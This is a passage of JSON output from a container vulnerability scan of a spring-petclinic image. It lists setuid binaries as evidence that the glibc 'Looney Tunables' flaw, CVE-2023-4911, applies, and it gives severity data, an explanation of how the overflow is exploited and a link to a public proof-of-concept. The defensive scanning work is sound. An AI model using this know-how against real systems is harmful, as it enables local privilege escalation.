                  "details": "Offset: 0x0000afd0, Symbol: __ctype_b_loc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000afd8, Symbol: _ITM_deregisterTMCloneTable, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000afe0, Symbol: __libc_start_main, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000afe8, Symbol: __gmon_start__, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000aff0, Symbol: _ITM_registerTMCloneTable, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000aff8, Symbol: __cxa_finalize, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000b5e0, Symbol: __environ, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/newgrp",
                  "details": "Offset: 0x0000b600, Symbol: stderr, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x00000000, Symbol: __cxa_finalize, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x000032d0, Symbol: fputs, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x00003370, Symbol: fgets, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ec18, Symbol: utime, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ec20, Symbol: __snprintf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ec28, Symbol: free, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ec30, Symbol: is_selinux_enabled, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ec38, Symbol: strcasecmp, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ec40, Symbol: closelog, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ec48, Symbol: pam_start, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ec50, Symbol: __errno_location, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ec58, Symbol: unlink, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ec60, Symbol: strncpy, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ec68, Symbol: strncmp, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ec70, Symbol: strcpy, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ec78, Symbol: chroot, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ec80, Symbol: sgetspent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ec88, Symbol: putspent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ec90, Symbol: ferror, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ec98, Symbol: lckpwdf, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000eca0, Symbol: qsort, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000eca8, Symbol: selinux_check_access, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ecb0, Symbol: fcntl, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ecb8, Symbol: write, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ecc0, Symbol: getpid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ecc8, Symbol: textdomain, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ecd0, Symbol: __open_2, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ecd8, Symbol: fclose, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ece0, Symbol: bindtextdomain, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ece8, Symbol: pam_chauthtok, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ecf0, Symbol: dcgettext, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ecf8, Symbol: strlen, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ed00, Symbol: __lxstat, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ed08, Symbol: getpwuid_r, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ed10, Symbol: pam_end, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ed18, Symbol: chdir, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ed20, Symbol: __stack_chk_fail, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ed28, Symbol: getuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ed30, Symbol: getopt_long, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ed38, Symbol: pam_strerror, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ed40, Symbol: strchr, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ed48, Symbol: snprintf, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ed50, Symbol: audit_open, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ed58, Symbol: strrchr, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ed60, Symbol: __assert_fail, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ed68, Symbol: fputs, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ed70, Symbol: memset, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ed78, Symbol: geteuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ed80, Symbol: selinux_set_callback, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ed88, Symbol: close, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ed90, Symbol: strspn, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ed98, Symbol: matchpathcon, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000eda0, Symbol: fputc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000eda8, Symbol: strcspn, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000edb0, Symbol: read, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000edb8, Symbol: fgets, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000edc0, Symbol: execve, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000edc8, Symbol: calloc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000edd0, Symbol: strcmp, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000edd8, Symbol: putc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ede0, Symbol: signal, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ede8, Symbol: strtoll, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000edf0, Symbol: setpwent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000edf8, Symbol: __memcpy_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ee00, Symbol: getprevcon, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ee08, Symbol: feof, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ee10, Symbol: umask, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ee18, Symbol: strtol, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ee20, Symbol: realpath, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ee28, Symbol: getgrnam, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ee30, Symbol: getpwent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ee38, Symbol: kill, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ee40, Symbol: fileno, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ee48, Symbol: getgid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ee50, Symbol: __xstat, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ee58, Symbol: setfscreatecon, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ee60, Symbol: malloc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ee68, Symbol: fflush, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ee70, Symbol: __vasprintf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ee78, Symbol: __fxstat, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ee80, Symbol: endpwent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ee88, Symbol: getlogin, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ee90, Symbol: fseek, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ee98, Symbol: security_getenforce, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000eea0, Symbol: __fgets_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000eea8, Symbol: __strncpy_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000eeb0, Symbol: setrlimit, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000eeb8, Symbol: setreuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000eec0, Symbol: setregid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000eec8, Symbol: realloc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000eed0, Symbol: fdopen, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000eed8, Symbol: getpwnam_r, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000eee0, Symbol: setlocale, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000eee8, Symbol: __printf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000eef0, Symbol: fchmod, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000eef8, Symbol: strftime, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ef00, Symbol: __syslog_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ef08, Symbol: fsync, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ef10, Symbol: waitpid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ef18, Symbol: getspnam, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ef20, Symbol: open, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ef28, Symbol: access, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ef30, Symbol: fchown, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ef38, Symbol: audit_log_user_avc_message, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ef40, Symbol: fopen, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ef48, Symbol: ulckpwdf, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ef50, Symbol: perror, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ef58, Symbol: rename, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ef60, Symbol: gmtime, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ef68, Symbol: strtoul, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ef70, Symbol: openlog, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ef78, Symbol: freecon, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ef80, Symbol: link, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ef88, Symbol: exit, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ef90, Symbol: __fprintf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ef98, Symbol: setuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000efa0, Symbol: strdup, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000efa8, Symbol: putpwent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000efb0, Symbol: strerror, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000efb8, Symbol: sleep, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000efc0, Symbol: getc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000efc8, Symbol: fork, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000efd0, Symbol: __ctype_b_loc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000efd8, Symbol: _ITM_deregisterTMCloneTable, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000efe0, Symbol: __libc_start_main, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000efe8, Symbol: __gmon_start__, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000eff0, Symbol: _ITM_registerTMCloneTable, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000eff8, Symbol: __cxa_finalize, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000f2b0, Symbol: misc_conv, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000f748, Symbol: fgets, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000f750, Symbol: fputs, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000fc08, Symbol: fgets, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000fc10, Symbol: fputs, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x00010160, Symbol: stdout, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x00010170, Symbol: stdin, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x00010178, Symbol: optind, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x00010180, Symbol: __environ, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x00010188, Symbol: optarg, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x000101a0, Symbol: stderr, Issue Found: SETUID binaries were found"
               }
            ]
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libc6:2.31-13+deb11u3",
            "vulnerability_id": "CVE-2023-4911",
            "result": "applicable"
         }
      },
      {
         "id": "XRAY-532786",
         "severity": "High",
         "jfrog_severity": "High",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "A buffer overflow was discovered in the GNU C Library's dynamic loader ld.so while processing the GLIBC_TUNABLES environment variable. This issue could allow a local attacker to use maliciously crafted GLIBC_TUNABLES environment variables when launching binaries with SUID permission to execute code with elevated privileges.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libc6",
         "source_id": "deb://debian:bullseye:libc6",
         "source_comp_id": "deb://debian:bullseye:libc6:2.31-13+deb11u3",
         "component_versions": {
            "id": "debian:bullseye:glibc",
            "vulnerable_versions": [
               "< 2.31-13+deb11u7"
            ],
            "fixed_versions": [
               "2.31-13+deb11u7"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-4911",
                     "cwe": [
                        "CWE-787"
                     ],
                     "cwe_details": {
                        "CWE-787": {
                           "name": "Out-of-bounds Write",
                           "description": "The product writes data past the end, or before the beginning, of the intended buffer.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "1"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "7.8/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "A buffer overflow was discovered in the GNU C Library's dynamic loader ld.so while processing the GLIBC_TUNABLES environment variable. This issue could allow a local attacker to use maliciously crafted GLIBC_TUNABLES environment variables when launching binaries with SUID permission to execute code with elevated privileges.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-532786",
            "VulnerabilityTitle": "",
            "ShortDescription": "A buffer overflow in glibc may lead to local privilege escalation when parsing a malicious environment variable.",
            "FullDescription": "At the beginning of its execution, ld.so is responsible for loading GLIBC_TUNABLES environment variables. A notable issue emerges when a GLIBC_TUNABLES variable adopts the format \"tunable1=tunable2=AAA\", and both \"tunable1\" and \"tunable2\" are SXID_IGNORE tunables. This particular scenario can lead to a buffer overflow in the copied GLIBC_TUNABLES variable. Utilizing this buffer overflow vulnerability, an attacker gains the ability to overwrite the pointer that directs the dynamic loader to its library search path. This pointer is critical in determining where the dynamic loader locates essential libraries. By manipulating this pointer, the attacker redirects the dynamic loader to load a malicious libc.so library situated in a location controlled by them. This malicious library may execute harmful code, ultimately facilitating an escalation of privileges.",
            "Impact": 6,
            "VulnerabilityType": "Local privilege escalation",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can only be exploited by an attacker that can execute code on the vulnerable machine (excluding exceedingly rare circumstances)",
                  "Description": "This vulnerability requires local access to exploit.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has an exploit published",
                  "Description": "This vulnerability has several published exploits with an extensive technical write-up. The Proof-of-concept has been demonstrated to lead to full root privileges on major Linux distributions: Ubuntu, Fedora, and Debian.",
                  "IsPositive": 0,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has multiple mentions in general media",
                  "Description": "The vulnerability received extensive media coverage and was nicknamed `Looney Tunables`.",
                  "IsPositive": 0,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are either extremely common or nonexistent (always exploitable)",
                  "Description": "The requirements to trigger the vulnerability are highly likely on default Linux machines.",
                  "IsPositive": 0,
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The vulnerability requires the following to be exploited:\n1. `GLIBC_TUNABLES` environment variable being enabled, which is enabled by default.\n2. The `ld.so` binary (the dynamic loader) must have SUID permissions, which is common on Linux.",
                  "IsPositive": 1,
                  "InsertOrder": 5
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Advisory",
                  "Url": "https://www.qualys.com/2023/10/03/cve-2023-4911/looney-tunables-local-privilege-escalation-glibc-ld-so.txt",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "Proof-of-concept",
                  "Url": "https://github.com/leesh3288/CVE-2023-4911",
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Technical Writeup",
                  "Title": "Technical writeup",
                  "Url": "https://www.qualys.com/2023/10/03/cve-2023-4911/looney-tunables-local-privilege-escalation-glibc-ld-so.txt",
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "https://sourceware.org/git/?p=glibc.git;a=commit;h=1056e5b4c3f2d90ed2b4a55f96add28da2f4c8fa",
                  "InsertOrder": 4
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": true,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libc6:2.31-13+deb11u3",
            "cve_id": "CVE-2023-4911",
            "scan_status": 1,
            "applicability": true,
            "evidence": [
               {
                  "column_names": [
                     "Path",
                     "Offset",
                     "Symbol",
                     "Issue Found"
                  ],
                  "rows": [
                     [
                        "/bin/mount",
                        "0x00000000",
                        "__cxa_finalize",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000db40",
                        "mnt_table_set_parser_errcb",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000db48",
                        "mnt_context_get_fs",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000db50",
                        "mnt_fs_get_source",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000db58",
                        "mnt_context_set_source",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000db60",
                        "__snprintf_chk",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000db68",
                        "mnt_context_is_restricted",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000db70",
                        "free",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000db78",
                        "mnt_unref_table",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000db80",
                        "mnt_fs_get_fstype",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000db88",
                        "mnt_context_mount",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000db90",
                        "__errno_location",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000db98",
                        "mnt_context_helper_executed",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dba0",
                        "strncpy",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dba8",
                        "strncmp",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dbb0",
                        "_exit",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dbb8",
                        "secure_getenv",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dbc0",
                        "mnt_fs_set_target",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dbc8",
                        "mnt_context_enable_fake",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dbd0",
                        "warn",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dbd8",
                        "ferror",
                        "SETUID binaries were found"
                     ],
                     [
                        "/bin/mount",
                        "0x0000dbe0",
                        "mnt_context_set_fstype",
                        "SETUID binaries were found"
                     ],
                     [
